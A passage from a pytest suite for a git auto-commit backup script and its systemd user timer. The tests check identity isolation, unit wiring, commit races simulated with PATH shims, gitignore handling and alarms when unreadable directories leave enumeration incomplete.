    It is now environment-independent by CONSTRUCTION rather than by fixture:
    commit.sh exports GIT_CONFIG_NOSYSTEM=1 and GIT_CONFIG_GLOBAL=/dev/null for
    every invocation, so no ambient config of either kind can reach git. The
    test deliberately passes NO config-related environment at all — if it needed
    to, the product would still be host-dependent.
    """
    store = _seed(tmp_path)
    p = _run(store)
    assert p.returncode == 0, p.stderr
    who = _git(store / "some-scope", "log", "-1", "--format=%an <%ae>").stdout
    assert "analyze-service-index@localhost" in who, (
        f"the seeded identity was not used (host gitconfig leaked in?): {who!r}")


def test_an_existing_configured_identity_is_not_overridden(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    _git(store / "some-scope", "config", "user.name", "Someone Real")
    _git(store / "some-scope", "config", "user.email", "real@example.com")
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    _run(store)
    who = _git(store / "some-scope", "log", "-1", "--format=%an <%ae>").stdout
    assert "Someone Real <real@example.com>" in who


def test_a_stray_markdown_file_at_the_store_root_warns_but_does_not_fail(tmp_path):
    """Unversioned content at the root is a real hazard, but a permanently-red
    gate trains you to click through (RULES.md). Warn, do not fail."""
    store = _seed(tmp_path)
    (store / "oops-a-service.md").write_text("stray\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "STORE ROOT" in p.stderr
    assert "oops-a-service.md" in p.stderr


# --------------------------------------------------------------------------- #
# 6. 🔴 SEAM — home.nix and the script are two surfaces
# --------------------------------------------------------------------------- #
def _home_nix() -> str:
    return HOME_NIX.read_text(encoding="utf-8")


def test_the_unit_execstart_resolves_to_the_script_these_tests_exercise():
    """🔴 The isolation-seam defect: a perfect script wired to a path that does
    not exist is a dead feature, and every test above would still pass."""
    m = re.search(r"ExecStart = \"\$\{pkgs\.bash\}/bin/bash "
                  r"%h/workspace/devrc/(scripts/analyze-service-index/[^\"]+)\"",
                  _home_nix())
    assert m, "no analyze-service-index ExecStart found in nix/home.nix"
    assert (ROOT / m.group(1)).is_file(), (
        f"ExecStart points at {m.group(1)}, which does not exist in the repo")
    assert (ROOT / m.group(1)).resolve() == SCRIPT.resolve()


def test_the_unit_restart_trigger_points_at_the_same_script():
    """X-Restart-Triggers is what re-runs the unit after a script-only edit. If
    it drifts from ExecStart the unit silently keeps running stale behaviour."""
    assert ('X-Restart-Triggers = [ "${../scripts/analyze-service-index/commit.sh}" ]'
            in _home_nix())


def test_the_unit_is_not_gated_on_server_mode():
    """🔴 A DELIBERATE decision, pinned so it cannot be "tidied" into the
    serverMode block beside it. The stores are per-host and NOT synced by
    ship.sh, so gating this out on the laptop leaves that host's index
    unversioned forever while the workbench looks healthy.

    🔴 ASSERTED POSITIVELY, NOT BY GREPPING FOR A TOKEN. This used to check that
    the substring `mkIf` did not appear between `=` and `{`, which is a SPELLED
    guard: `= lib.optionalAttrs serverMode {` contains no `mkIf`, passes, and
    produces exactly the gating the test forbids (MEASURED — it survived the
    whole suite). So require the declaration to be UNCONDITIONAL by shape: an
    unbroken `= {`, with nothing whatsoever in between.
    """
    src = _home_nix()
    for kind in ("services", "timers"):
        decl = re.search(
            rf"systemd\.user\.{kind}\.analyze-service-index-commit\s*=\s*([^{{]*)\{{",
            src)
        assert decl, f"no {kind} declaration found in nix/home.nix"
        between = decl.group(1).strip()
        assert between == "", (
            f"the {kind} declaration is CONDITIONAL — it must read "
            f"`systemd.user.{kind}.analyze-service-index-commit = {{` with "
            f"nothing between `=` and `{{`, but found {between!r}. Any wrapper "
            "here (mkIf, optionalAttrs, an `if`) can gate the unit out of a "
            "host and leave that host's index silently unversioned.")


def test_the_unit_is_wired_to_the_failure_toast():
    """Failure must be LOUD. Without OnFailure a failed backup is a journal line
    nobody reads."""
    src = _home_nix()
    i = src.index("systemd.user.services.analyze-service-index-commit")
    block = src[i:i + 1200]
    assert 'OnFailure = [ "notify-failure@%n.service" ]' in block


def test_the_timer_is_hourly_and_catches_up_a_missed_run():
    """🔴 HOURLY, NOT DAILY, AND THE NUMBER IS THE POINT.

    Content created and destroyed between two runs never reaches any commit and
    is unrecoverable. That window cannot be CLOSED without committing at write
    time — but "cannot be closed" was being used to argue for leaving it at 24 h,
    and it is not an argument for that. Hourly cuts it 24×.

    The cost, MEASURED 2026-08-07 under the unit's full sandbox, at two points so
    the claim carries its own scope: ~80 ms for a 1-scope store, ~200-220 ms for
    a 21-scope / 84-file / 204 KB store (the live store's shape). No network
    (PrivateNetwork=true), no remote, no other host. 24 runs a day is ~5 s.

    RandomizedDelaySec must stay well inside the hour or runs pile up.
    """
    src = _home_nix()
    i = src.index("systemd.user.timers.analyze-service-index-commit")
    block = src[i:i + 900]
    assert re.search(r'OnCalendar = "hourly"', block), (
        "the timer is no longer hourly. A daily cadence leaves a 24-hour "
        "unrecoverable create-and-destroy window; hourly costs ~200 ms a run.")
    assert "Persistent = true" in block
    m = re.search(r"RandomizedDelaySec = (\d+)", block)
    assert m, "no RandomizedDelaySec on the timer"
    assert int(m.group(1)) < 3600, (
        f"RandomizedDelaySec is {m.group(1)}s, >= the hourly period — runs can "
        "overlap or be skipped.")


def test_the_timer_is_actually_installed_into_timers_target():
    """🔴 BLOCKING, and the reason this test exists separately: without an
    `Install.WantedBy` home-manager renders no `[Install]` section, never writes
    the `timers.target.wants` symlink, and the timer NEVER FIRES. The whole PR
    becomes a no-op — a backup that does not run — and MEASURED, deleting the
    Install block passed every other test in this file.

    `OnCalendar` and `Persistent` say WHEN it would fire; only this says THAT it
    is wired up at all."""
    src = _home_nix()
    i = src.index("systemd.user.timers.analyze-service-index-commit")
    block = src[i:i + 600]
    assert 'Install = {' in block, (
        "the timer has no Install block — home-manager will not enable it and "
        "it will never fire")
    assert 'WantedBy = [ "timers.target" ]' in block, (
        "the timer's Install.WantedBy is not timers.target — it will not be "
        "started by the timer target and the autocommit never runs")


def test_the_unit_cannot_hang_forever():
    """A oneshot with no timeout that wedges on a stale lock pins the timer and
    the backup silently stops, with the unit stuck in `activating`."""
    src = _home_nix()
    i = src.index("systemd.user.services.analyze-service-index-commit")
    block = src[i:i + 1200]
    m = re.search(r"TimeoutStartSec = (\d+);", block)
    assert m, "no TimeoutStartSec on the oneshot — a wedged run pins the timer"
    assert 0 < int(m.group(1)) <= 900, (
        f"TimeoutStartSec={m.group(1)} is not a bound that fails fast")


# --------------------------------------------------------------------------- #
# 7. 🔴 REGRESSIONS — each of these FAILED on the pre-fix tree (measured)
# --------------------------------------------------------------------------- #
def test_a_status_warning_on_stderr_is_not_mistaken_for_dirty_state(tmp_path):
    """🔴 `git status` can exit 0 and still WRITE TO STDERR. Folding stderr into
    stdout (`2>&1`) made that warning the "dirty state": a genuinely CLEAN tree
    was reported dirty, the run FAILED naming the wrong cause, the change count
    counted warning lines, and the warning text was embedded in the commit
    message body.

    Reproduced with an unreadable subdirectory — `warning: could not open
    directory 'sub/': Permission denied`, rc=0, empty stdout.

    🔴 DELIBERATE CONTRACT CHANGE, and the SECOND time this fixture has moved —
    the same change test_a_status_warning_never_reaches_the_commit_message
    records for the DIRTY path now reaches the CLEAN one. An unreadable
    subdirectory makes the enumeration incomplete, and that alarm used to be
    unreachable on a clean tree, so a permanently-unreadable directory reported
    `ok` forever while its content sat unversioned. It now fails.

    So this test no longer asserts `rc == 0`, and the distinction matters: rc was
    never this test's invariant, it was a PROXY for one, and the proxy and the
    invariant have come apart. What it owns is that a warning on stderr is not
    read as DIRTY STATE — asserted directly below (clean-path message, no commit,
    no warning text in the history) rather than inferred from an exit code that
    now moves for an unrelated and correct reason.
    """
    store = _seed(tmp_path)
    assert _run(store).returncode == 0
    before_commits = _commits(store / "some-scope")
    blocked = store / "some-scope" / "sub"
    blocked.mkdir()
    blocked.chmod(0o000)
    try:
        p = _run(store)
    finally:
        blocked.chmod(0o755)
    assert "clean — nothing to commit" in p.stdout, (
        f"the warning was mistaken for dirty state; stdout was:\n{p.stdout}")
    assert _commits(store / "some-scope") == before_commits, (
        "a commit was created from a warning line — the warning became the "
        "dirty state, which is the whole defect this test pins")
    assert "Permission denied" in p.stderr, (
        "the warning was swallowed entirely — it must still be surfaced, just "
        "not as dirty state")
    # The run DOES fail, and it must fail for the enumeration reason, not for a
    # dirty tree. A test that accepted any non-zero exit would go green on
    # exactly the regression it exists to catch.
    assert p.returncode != 0
    assert "enumeration was INCOMPLETE" in p.stderr, (
        f"the run failed for the WRONG reason — a warning is being read as "
        f"dirty state again:\n{p.stderr}")
    assert "tree is dirty" not in p.stderr, (
        f"the clean tree was reported as dirty:\n{p.stderr}")


def test_a_status_warning_never_reaches_the_commit_message(tmp_path):
    """The other half of the same defect: `before` is pasted verbatim into the
    commit body, so a warning line became part of the permanent history.

    🔴 DELIBERATE CONTRACT CHANGE, recorded here because this test used to
    assert rc=0 on exactly this fixture. An unreadable subdirectory also makes
    `find` exit non-zero, and that exit code used to be DISCARDED (the candidate
    list was piped straight into `sort -zu`). A scope was therefore enumerated
    PARTIALLY and the run still reported success — index files that could not be
    seen were silently never staged, which is the loss this unit exists to stop.

    The new contract is protect-then-alarm, and this test now pins BOTH halves:
      * everything readable IS still committed, with a clean message and an
        uninflated count — the guarantee this test was written for; and
      * the run FAILS, naming the incomplete enumeration, because part of the
        scope is genuinely unaccounted for.
    Refusing to commit at all would have been the wrong fix: a bad `sub/` would
    then block `alpha.md` from ever being backed up.
    """
    store = _seed(tmp_path)
    _run(store)
    blocked = store / "some-scope" / "sub"
    blocked.mkdir()
    blocked.chmod(0o000)
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    try:
        p = _run(store)
    finally:
        blocked.chmod(0o755)

    msg = _git(store / "some-scope", "log", "-1", "--format=%B").stdout
    assert "Permission denied" not in msg, (
        f"a stderr warning was committed into the message body:\n{msg}")
    assert "1 change(s)" in msg, (
        f"the change count was inflated by warning lines:\n{msg}")
    assert "CHANGED" in _git(store / "some-scope", "show", "HEAD:alpha.md").stdout, (
        "the readable content was NOT committed — the enumeration guard is "
        "causing the data loss it exists to prevent")
    assert p.returncode != 0, (
        "a partially-enumerated scope reported success; find's rc is being "
        f"discarded again:\n{p.stdout}")
    assert "enumeration was INCOMPLETE" in p.stderr, (
        f"a DIFFERENT guard fired — this one is unreached:\n{p.stderr}")


def _racing_git(tmp_path, body, once=True):
    """A deterministic stand-in for a write landing in the window between
    `git add` and `git commit`. Returns a PATH value to pass to `_run`.

    🔴 THIS USED TO BE A pre-commit HOOK, AND CANNOT BE ANY MORE. commit.sh now
    pins `core.hooksPath` at an empty directory for every invocation — that is
    the control which kills the ambient-git-config exfiltration path
    (test_an_ambient_git_hook_does_not_fire). A hook-based fixture would
    therefore never fire, and would go green while measuring NOTHING, which is
    the exact failure mode this suite keeps closing elsewhere.

    A PATH shim is also the more honest stand-in: the race being simulated is a
    concurrent WRITER touching the store, not a hook the repo opted into. The
    shim runs `body` when it first sees a literal `commit` argument, then execs
    the real git.

    🔴 The shebang belongs to testlib.mockbin, not to this call site.
    `#!/usr/bin/env bash` works on the dev host and does NOT exist in the nix
    build sandbox (MEASURED: green locally, red in the authoritative tier).
    """
    real = shutil.which("git")
    assert real, "git is not on PATH — the shim would recurse into itself"
    bindir = tmp_path / "racebin"
    bindir.mkdir(exist_ok=True)
    marker = tmp_path / "raced.marker"
    if once:
        inner = (f'if [ ! -e "{marker}" ]; then\n'
                 f'      {body}\n'
                 f'      : > "{marker}"\n'
                 f'    fi')
    else:
        inner = body
    write_exec(bindir / "git", (
        'for a in "$@"; do\n'
        '  if [ "$a" = "commit" ]; then\n'
        f'    {inner}\n'
        '    break\n'
        '  fi\n'
        'done\n'
        f'exec {real} "$@"\n'))
    return f"{bindir}:{os.environ['PATH']}"


def test_a_covered_file_written_during_the_commit_is_not_a_failure(tmp_path):
    """🔴 The one race the design GUARANTEES. The store is written by agents at
    arbitrary times, so a `.md` write can land between `git add` and `git
    commit`. That used to produce rc=1, a failed unit, a sticky critical toast
    and the message "Something is not covered by the *.md allowlist" — about a
    file that IS covered. No data was lost, so it was a pure false positive
    sending the operator to the wrong place.

    Now it is retried and committed."""
    store = _seed(tmp_path)
    _run(store)
    scope = store / "some-scope"
    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    path = _racing_git(tmp_path, f'printf "raced\\n" > "{scope}/gamma.md"')
    p = _run(store, PATH=path)
    assert p.returncode == 0, (
        f"a benign covered-file race failed the unit:\n{p.stderr}")
    assert "not covered by the *.md allowlist" not in p.stderr, (
        f"the wrong cause was reported for a covered file:\n{p.stderr}")
    assert "re-dirtied" in p.stdout, (
        f"the race was not identified as a re-dirty:\n{p.stdout}")
    tracked = _git(scope, "ls-files").stdout.split()
    assert "gamma.md" in tracked, (
        f"the racing file was never committed: {tracked}")
    assert _git(scope, "status", "--porcelain").stdout == ""


def test_a_genuinely_uncovered_file_is_still_a_loud_failure(tmp_path):
    """🔴 REACHABILITY + the complement of the test above. Softening the race
    must NOT soften the real guard: a non-.md file that survives the commit is
    still rc=1, and the message must name the path rather than the whole tree."""
    store = _seed(tmp_path)
    _run(store)
    scope = store / "some-scope"
    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    path = _racing_git(tmp_path, f'printf "x\\n" > "{scope}/secret.pem"')
    p = _run(store, PATH=path)
    assert p.returncode != 0, (
        f"an uncovered file surviving the commit was reported as success:\n{p.stdout}")
    assert "STILL DIRTY" in p.stderr, p.stderr
    assert "secret.pem" in p.stderr, p.stderr
    assert "neither matched by the *.md allowlist nor already tracked" in p.stderr
    assert "secret.pem" not in _git(scope, "ls-files").stdout


def test_a_gitignored_index_file_is_reported_as_its_own_named_error(tmp_path):
    """🔴 A `*.md` line in a scope's .gitignore makes EVERY index file in that
    scope unversionable, forever.

    What used to happen (MEASURED): `git add` failed with "The following paths
    are ignored by one of your .gitignore files", the run exited 1, and it did
    so byte-identically on every subsequent run. That reads as a tooling
    complaint and buries the only fact that matters — this content is not being
    backed up — behind a hint about `-f`. A permanently-red gate is worse than
    no gate (RULES.md): it trains the operator to dismiss the toast.

    Now it is pre-filtered through `git check-ignore` and reported by name,
    before anything is staged.
    """
    store = _seed(tmp_path)
    assert _run(store).returncode == 0
    scope = store / "some-scope"
    (scope / ".gitignore").write_text("*.md\n", encoding="utf-8")
    (scope / "gamma.md").write_text("new index content\n", encoding="utf-8")

    p = _run(store)
    assert p.returncode != 0, "a permanently-unversionable index file exited 0"
    assert "an index file is gitignored and will therefore never be versioned" in p.stderr, (
        f"a DIFFERENT guard fired — the named error is unreached:\n{p.stderr}")
    assert "gamma.md" in p.stderr, "the error does not name the affected path"
    assert "ignored by one of your .gitignore files" not in p.stderr, (
        "git's own message leaked through, which is the burying this fixes")
    # 🔴 The index is left untouched — a half-staged scope means a human's next
    # `git commit` in that directory picks up a surprise.
    assert _git(scope, "diff", "--cached", "--name-only").stdout == "", (
        "the run left paths staged in the index")


def test_a_gitignore_that_does_not_match_the_index_is_not_flagged(tmp_path):
    """🔴 NEGATIVE CONTROL for the check above — a `.gitignore` is not itself a
    problem. Only one that swallows index files is. Without this, pre-filtering
    could reject every scope carrying any .gitignore and nothing would notice."""
    store = _seed(tmp_path)
    assert _run(store).returncode == 0
    scope = store / "some-scope"
    (scope / ".gitignore").write_text("*.tmp\n", encoding="utf-8")
    (scope / "gamma.md").write_text("new index content\n", encoding="utf-8")

    p = _run(store)
    assert "gitignored" not in p.stderr, (
        f"a harmless .gitignore was flagged:\n{p.stderr}")
    assert "gamma.md" in _git(scope, "ls-files").stdout, (
        "the new index file was not committed")


def test_a_chronically_racing_scope_exits_0_but_leaves_a_greppable_marker(tmp_path):
    """🔴 PINNING A JUDGEMENT CALL. Both mutants of this branch survived the
    previous round: returning 1 instead of warning, and changing the two-pass
    cadence.

    The decision is right — nothing has been lost, every remaining path is
    covered, and the next run commits it, so failing the unit would fire a
    critical toast for a non-event. But exit 0 means a scope that races EVERY
    day is invisible in `systemctl status` forever. So the marker is asserted
    alongside the exit code: rc=0 AND the specific warning AND a token that
    `journalctl … | grep ASI-RACE-UNSETTLED` can count.

    A writer that never stops is what reaches this branch — `once=False`.
    """
    store = _seed(tmp_path)
    _run(store)
    scope = store / "some-scope"
    (scope / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    path = _racing_git(
        tmp_path,
        f'printf "race-$$\\n" > "{scope}/racing.md"',
        once=False)

    p = _run(store, PATH=path)
    assert p.returncode == 0, (
        "a self-healing race was turned into a FAILED unit — nothing is lost on "
        f"this path, so it must not fire the critical toast:\n{p.stderr}")
    assert "ASI-RACE-UNSETTLED" in p.stderr, (
        "the greppable marker is gone; a scope racing every day is now "
        f"invisible behind exit 0:\n{p.stderr}")
    assert "still dirty after two passes" in p.stderr, (
        f"the specific warning text changed:\n{p.stderr}")
    assert "STILL DIRTY" not in p.stderr, (
        "the covered-race path reported the uncovered-path failure message")


def test_a_dirty_tree_with_no_candidate_paths_fails_loudly(tmp_path):
    """🔴 M1 — this guard had ZERO coverage: deleting it left the suite fully
    green. It IS reachable: a scope that is already a repo, has no tracked
    files, and holds one untracked NON-.md file enumerates nothing at all, which
    is a different condition from "enumerated something that staged to nothing".
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    scope.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "trunk", str(scope)], check=True)
    (scope / "notes.txt").write_text("not an index file\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode != 0, "a dirty scope with nothing enumerable exited 0"
    assert "no candidate paths were enumerated" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")
    assert "notes.txt" in p.stderr


def test_an_unreadable_scope_is_not_reported_as_having_no_index_files(tmp_path):
    """🔴 M2, the silent half. The "is there anything to bootstrap?" probe used
    to pipe `find` into `grep -q .`, which DISCARDS find's exit code. An
    unreadable scope then produced no output, read as "no *.md files", and was
    SKIPPED with a success message — an empty result standing in for a clean
    one, on the single path whose job is to notice new content.

    Reachability note: the scope must have no repo and no readable *.md, or
    `find -print -quit` exits 0 before it ever reaches the unreadable directory
    and this guard is never executed.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    blocked = scope / "sub"
    blocked.mkdir(parents=True)
    blocked.chmod(0o000)
    try:
        p = _run(store)
    finally:
        blocked.chmod(0o755)
    assert p.returncode != 0, (
        f"an unreadable scope was reported as a clean skip:\n{p.stdout}")
    assert "could not enumerate *.md files" in p.stderr, (
        f"a DIFFERENT guard fired — this one is still unreached:\n{p.stderr}")
    assert "skipping" not in p.stdout


def test_an_unreadable_subdirectory_still_alarms_once_the_tree_is_CLEAN(tmp_path):
    """🔴 THE ALARM WAS UNREACHABLE ON THE CLEAN PATH — i.e. on every run after
    the first, i.e. forever.

    `commit_scope` returned at `[ -z "$before" ]` before `commit_once` ever
    called `list_candidates`, so ASI_ENUM_RC stayed 0 and `enum_verdict` was
    never consulted. MEASURED on the previous round's tree, one scope holding a
    readable `alpha.md` and an unreadable `sub/hidden.md`:

        run 1 (tree dirty)  → alarms, rc=1          ← the only alarm, ever
        run 2 (tree clean)  → "clean — nothing to commit", rc=0
        run 3 (tree clean)  → "clean — nothing to commit", rc=0

    with `git ls-files` holding `alpha.md` alone and `sub/hidden.md` sitting
    unversioned on disk. One toast, once — then permanent silence over live data
    loss. That is the exact shape of the bug this whole unit exists to prevent,
    reproduced by its own alarm.

    So the enumeration now runs BEFORE the clean-tree return. This asserts the
    SECOND run, deliberately: run 1 alarms for a reason that already worked, and
    a test that only checked run 1 is what let this survive.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    blocked = scope / "sub"
    blocked.mkdir(parents=True)
    (scope / "alpha.md").write_text("readable\n", encoding="utf-8")
    (blocked / "hidden.md").write_text("UNREADABLE\n", encoding="utf-8")

    try:
        blocked.chmod(0o000)
        first = _run(store)
        blocked.chmod(0o755)
        # The tree is now clean as far as git can see: alpha.md is committed and
        # sub/ is unreadable, so status reports nothing.
        blocked.chmod(0o000)
        second = _run(store)
        blocked.chmod(0o000)
        third = _run(store)
    finally:
        blocked.chmod(0o755)

    assert first.returncode != 0, "the DIRTY run did not alarm — different bug"
    assert "alpha.md" in _git(scope, "ls-files").stdout, (
        "the readable content was not committed — the guard must protect first "
        "and alarm second, never refuse outright")

    for label, p in (("second", second), ("third", third)):
        assert p.returncode != 0, (
            f"the {label} (CLEAN-tree) run reported success while "
            f"sub/hidden.md sat unversioned:\n{p.stdout}")
        assert "enumeration was INCOMPLETE" in p.stderr, (
            f"a DIFFERENT guard fired on the {label} run — this one is still "
            f"unreached:\n{p.stderr}")
        assert "clean — nothing to commit" in p.stdout, (
            f"the {label} run was not actually on the clean path, so it does "
            f"not test what it claims:\n{p.stdout}")


def test_an_unreadable_subdirectory_does_not_stop_a_NEW_scope_being_bootstrapped(tmp_path):
    """🔴 THE BOOTSTRAP PROBE REFUSED OUTRIGHT, WHICH IS THE DATA LOSS ITSELF.

    `commit_scope`'s "is there anything to bootstrap?" probe treated ANY non-zero
    `find` rc as a reason to `return 1` *before* `git init` ran. MEASURED
    2026-08-09 (GNU findutils 4.10.0) on a NEW scope holding a readable
    `alpha.md` beside an unreadable `sub/`: `find … -print -quit` exits 1 AND
    prints `alpha.md` — `-quit` does not clear an error that already occurred —
    so the scope was left with no `.git` at all, run after run, and alpha.md was
    never versioned. The guard that exists to stop a silent skip was causing the
    loss it is meant to catch; `commit_once` already says the rule out loud
    ("Protect first, then alarm") and this path did not follow it.

    This pins the FIRST run specifically — the moment of bootstrap — which is the
    only run on which the refusal was observable, and asserts BOTH halves:
    the content is versioned, and the incompleteness is still loud with THIS
    guard's own message rather than merely a non-zero exit.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    blocked = scope / "sub"
    blocked.mkdir(parents=True)
    (scope / "alpha.md").write_text("readable\n", encoding="utf-8")
    (blocked / "hidden.md").write_text("UNREADABLE\n", encoding="utf-8")

    try:
        blocked.chmod(0o000)
        first = _run(store)
    finally:
        blocked.chmod(0o755)

    assert (scope / ".git").is_dir(), (
        f"the scope was never bootstrapped, so its readable content is "
        f"unversioned forever:\n{first.stdout}\n{first.stderr}")
    assert "alpha.md" in _git(scope, "ls-files").stdout, (
        f"readable content was not committed on the bootstrap run:\n"
        f"{first.stdout}\n{first.stderr}")
    assert "refusing to report a clean skip" not in first.stderr, (
        f"the probe still refused outright:\n{first.stderr}")
    assert first.returncode != 0, (
        f"protecting the readable content must NOT silence the alarm:\n"
        f"{first.stdout}")
    assert "enumeration was INCOMPLETE" in first.stderr, (
        f"a DIFFERENT guard produced the non-zero exit — this one is still "
        f"unreached:\n{first.stderr}")


def test_the_incomplete_enumeration_alarm_clears_when_the_scope_becomes_readable(tmp_path):
    """🔴 THE OTHER HALF: a red gate nobody can clear trains you to ignore it
    (RULES.md). Making the clean path alarm is only correct if `chmod` silences
    it — otherwise this is a permanently-red gate, which is worse than none.

    Also a negative control for the test above: it proves the failure there is
    caused by the unreadable directory and not by the fixture's mere shape.
    """
    store = tmp_path / "store"
    scope = store / "some-scope"
    blocked = scope / "sub"
    blocked.mkdir(parents=True)
    (scope / "alpha.md").write_text("readable\n", encoding="utf-8")
    (blocked / "hidden.md").write_text("was unreadable\n", encoding="utf-8")

    try:
        blocked.chmod(0o000)
        _run(store)
        blocked.chmod(0o000)
        still_red = _run(store)
    finally:
        blocked.chmod(0o755)
    assert still_red.returncode != 0, "precondition: the alarm should be firing"

    healed = _run(store)
    assert healed.returncode == 0, (
        f"the alarm did not clear after chmod — it is a permanently-red gate:\n"
        f"{healed.stdout}\n{healed.stderr}")
    assert "enumeration was INCOMPLETE" not in healed.stderr
    tracked = _git(scope, "ls-files").stdout
    assert "sub/hidden.md" in tracked, (
        f"the previously-unreadable content was still not versioned: {tracked}")


def _find_shim_that_fails_the_scope_walk(tmp_path, walk_type="d"):
    """PATH shim whose `find` runs the REAL find, prints everything it found, and
    THEN exits 1 — but only for the depth-1 `-type <walk_type>` walk (`d` = the
    scope-directory walk, `l` = the symlinked-scope walk).

    Parameterised on purpose: the two walks share a root, so a chmod fixture
    fails BOTH and cannot tell their two recorded rcs apart — a mutation sweep
    found that dropping the symlink walk's rc capture killed no test. Selecting
    one walk is what makes each capture independently observable.

    This is the exact shape GNU findutils 4.10.0 produces on the sibling probe
    (`find … -print -quit` prints its match AND exits 1, because `-quit` does not
    clear an error that has already occurred), reproduced deterministically at a
    level where a real permission fixture cannot produce it: MEASURED, a
    `-maxdepth 1` walk does NOT error on an unreadable CHILD directory, so the
    only real-world failure of this walk is the root itself, which yields an
    EMPTY list. The partial list is therefore unreachable with chmod alone — and
    "process what was enumerated" is precisely the property that must not
    silently rot into "refuse the whole run", which is #372's bug one level up.

    🔴 Shebang belongs to testlib.mockbin (see _racing_git).
    """
    real = shutil.which("find")
    assert real, "find is not on PATH — the shim would recurse into itself"
    bindir = tmp_path / f"findbin-{walk_type}"
    bindir.mkdir(exist_ok=True)
    write_exec(bindir / "find", (
        'prev=""\n'
        'scopewalk=0\n'
        'for a in "$@"; do\n'
        f'  if [ "$prev" = "-type" ] && [ "$a" = "{walk_type}" ]; then scopewalk=1; fi\n'
        '  prev="$a"\n'
        'done\n'
        f'{real} "$@"\n'
        'rc=$?\n'
        'if [ "$scopewalk" = "1" ]; then exit 1; fi\n'
        'exit $rc\n'))
    return f"{bindir}:{os.environ['PATH']}"


def test_an_unreadable_store_root_is_not_reported_as_an_empty_store(tmp_path):
    """🔴 THE SILENT ZERO AT THE OUTERMOST WALK. `list_scopes` was
    `find … | sort -z`, read as `< <(list_scopes)` — a process substitution
    discards the function's rc as completely as the pipe discards find's. So a
    store root that could not be READ enumerated nothing, fell through to the
    `seen -eq 0` branch, and printed

        "no scope directories under <store> — nothing to do"   (rc=0)

    over content that exists. MEASURED 2026-08-10 against pre-fix commit.sh
    (GNU findutils 4.10.0 — the `find` a script gets from PATH; note the
    interactive `find` on this host is aliased to bfs 4.1.1, which returns 0 on
    the same fixture and would have talked you out of the bug): store at mode
    0300 over a real `alpha/svc.md`, find rc=1, script rc=0.

    That is the mirror of #372. There an enumeration failure REFUSED legitimate
    work; here it was discarded entirely and read as "there is nothing to do".
    Same primitive, opposite failure, both silent.

    🔴 POSITIVE CONTROL IS PART OF THIS TEST, NOT A SEPARATE ONE. This is a bug
    about a check that cannot see, so a test asserting a zero is worthless until
    the same fixture has been watched to produce a NON-zero: the readable run
    below must report 1 scope processed. 1 on the positive control, 0 under test.
    """
    store = tmp_path / "store"
    scope = store / "alpha"
    scope.mkdir(parents=True)
    (scope / "svc.md").write_text("real content\n", encoding="utf-8")

    # --- positive control: the fixture CAN produce a non-zero scope count ---
    control = _run(store)
    assert control.returncode == 0, f"{control.stdout}\n{control.stderr}"
    assert "1 scope(s) processed" in control.stdout, (
        f"the fixture never enumerated a scope even when readable — a zero "
        f"below would then prove nothing:\n{control.stdout}")

    try:
        store.chmod(0o300)          # write+search, NOT readable → find rc=1
        blind = _run(store)
    finally:
        store.chmod(0o700)

    assert "nothing to do" not in blind.stdout, (
        f"a store that could not be READ was reported as a store that is "
        f"EMPTY:\n{blind.stdout}")
    assert blind.returncode != 0, (
        f"an unenumerable store root exited 0:\n{blind.stdout}\n{blind.stderr}")
    assert "scope enumeration of" in blind.stderr and (
        "was INCOMPLETE" in blind.stderr), (
        f"a DIFFERENT guard produced the non-zero exit — this one is still "
        f"unreached:\n{blind.stderr}")

    healed = _run(store)
    assert healed.returncode == 0, (
        f"the alarm did not clear after chmod — a permanently-red gate is worse "
        f"than no gate:\n{healed.stdout}\n{healed.stderr}")
    assert "1 scope(s) processed" in healed.stdout


def test_a_partial_scope_enumeration_still_commits_the_scopes_it_did_see(tmp_path):
    """🔴 THE OVER-CORRECTION THIS FIX MUST NOT MAKE. Failing the run on a bad
    enumeration rc is only half right: doing it BEFORE the walk would refuse
    every scope that WAS listed because one entry could not be read — which is
    exactly #372 ("the guard meant to stop a silent skip was causing the loss it
    exists to catch"), relocated from the scope level to the store level.

    Protect first, then alarm: with a `find` that emits the full list and then
    exits 1, the scope must still be bootstrapped and committed, AND the run must
    still fail with the store-level INCOMPLETE message.
    """
    store = tmp_path / "store"
    scope = store / "alpha"
    scope.mkdir(parents=True)
    (scope / "svc.md").write_text("real content\n", encoding="utf-8")

    p = _run(store, PATH=_find_shim_that_fails_the_scope_walk(tmp_path))

    assert (scope / ".git").is_dir(), (
        f"the enumeration rc refused the whole run, so a readable scope was "
        f"left unversioned — this is #372 one level up:\n"
        f"{p.stdout}\n{p.stderr}")
    assert "svc.md" in _git(scope, "ls-files").stdout, (
        f"the scope was reached but its content was never committed:\n"
        f"{p.stdout}\n{p.stderr}")
    assert p.returncode != 0, (
        f"protecting the readable scope must NOT silence the alarm:\n{p.stdout}")
    assert "scope enumeration of" in p.stderr and "was INCOMPLETE" in p.stderr, (
        f"a DIFFERENT guard produced the non-zero exit — this one is still "
        f"unreached:\n{p.stderr}")
    assert "ok — 1 scope(s) processed" not in p.stdout, (
        f"a partial view of the store was reported as a completed run:\n"
        f"{p.stdout}")


def test_the_find_shim_only_fails_the_scope_walk(tmp_path):
    """Positive/negative control for the shim above. Without it the same fixture
    exits 0, so the failure in that test is caused by the injected rc and not by
    the shim breaking `find` for everything (which would make the assertions
    pass for the wrong reason — the shim is an instrument, and an instrument's
    verdict is a claim about the instrument until both controls are watched)."""
    store = tmp_path / "store"
    scope = store / "alpha"
    scope.mkdir(parents=True)
    (scope / "svc.md").write_text("real content\n", encoding="utf-8")

    shimmed = _run(store, PATH=_find_shim_that_fails_the_scope_walk(tmp_path))
    assert shimmed.returncode != 0, "the shim injected no failure at all"

    fresh = tmp_path / "store2"
    (fresh / "alpha").mkdir(parents=True)
